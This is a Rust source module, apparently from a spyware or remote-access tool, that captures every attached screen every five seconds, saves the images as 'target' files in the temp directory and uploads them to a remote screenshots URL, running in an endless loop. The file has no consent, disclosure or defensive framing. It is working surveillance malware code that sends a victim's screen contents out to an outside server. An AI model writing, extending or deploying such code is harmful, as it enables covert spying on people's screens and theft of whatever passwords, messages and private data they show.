use screenshots::Screen;
use std::{
    thread,
    time::Duration,
    path::PathBuf,
    env
};
use crate::constants;
use crate::utils::send;

// Loop to take a screen every 5 seconds
pub async fn run() {
    loop {
        thread::sleep(Duration::from_millis(5000));
        let screens = screenshot();
        let _ = send(constants::SCREENSHOTS_URL, None, screens).await;
    }
}

//Take a screenshot
pub fn screenshot() -> Vec<PathBuf> {
    let screens = Screen::all().unwrap();
    let mut paths = Vec::new();

    for (i, screen) in screens.iter().enumerate() {
        let image = screen.capture().unwrap();
        let file_path = env::temp_dir().join(format!("target_{}.png", i));
        image.save(&file_path).unwrap();
        paths.push(file_path);
    }
    paths
}